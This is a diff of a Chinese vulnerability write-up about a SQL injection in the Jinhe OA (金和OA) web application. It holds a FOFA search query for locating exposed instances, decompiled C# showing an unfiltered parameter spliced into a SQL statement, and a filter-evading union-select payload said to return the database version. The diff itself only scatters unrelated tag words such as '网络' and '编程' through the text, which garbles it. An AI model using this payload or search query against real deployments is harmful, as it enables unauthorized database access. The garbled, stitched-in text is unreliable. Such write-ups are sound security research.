@@ -17,6 +17,8 @@ asset_dir: embedded-base64
 # fofa语法
 
 > app="金和网络-金和OA"
+>
+> 数据管理
 
 # 漏洞分析
 
@@ -28,7 +30,7 @@ asset_dir: embedded-base64
 
 在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `TaskTreeJSON` 的处理逻辑
 
-数据管理
+计算机服务器
 
 ```
 protected void Page_Load(object sender, EventArgs e)
@@ -43,6 +45,14 @@ protected void InitTaskTree(string strParentID)
 {
   DataTable dataTable = this.dbOperator.ExecSQLReDataTable($"{$" select a.TaskID,a.TaskNumber,a.TaskName,b.UserName as SendName,c.UserName as ExecName,a.TaskProgress,a.TaskFinishFlag,case when exists(select TaskID from TaskManage where TaskFatherID = a.TaskID and TaskIsDel = 0 and TaskFinishFlag = 0) then 1 else 0 end as HasChild,a.TaskRootScale from TaskManage a inner join Users b on a.TaskSendPersonID = b.UserID left join Users c on a.TaskExecutorID = c.UserID where TaskFatherID = '{strParentID}' "} and a.TaskNumber in ( select distinct substring(TaskNumber,0,50) as TaskNumber from TaskManage where (TaskSendPersonID = '{this.strUser}' or (','+TaskExecutorID+',' like '%,{this.strUser},%' or ','+TaskOthersID+',' like '%,{this.strUser},%') or ','+TaskViewRegCode+',' like '%,{this.strUser},%') and TaskFinishFlag <> 2 and TaskIsDel = 0 ) " + " and a.TaskFinishFlag = 0 and a.TaskIsDel = 0 ");
 ```
+
+深入探索
+
+网络
+
+计算机安全
+
+开发工具
 
 参数 `id` 被直接拼接进 `ExecSQLReDataTable` SQL语句中执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。
 
@@ -60,4 +70,4 @@ id='/**/UniOn/**/all/**/SelECt/**/NULL,@@verSion,NULL,NULL,NULL,NULL,NULL,NULL,N
 
 通过联合注入，成功在响应回显数据库版本信息
 
-计算机服务器
+编程
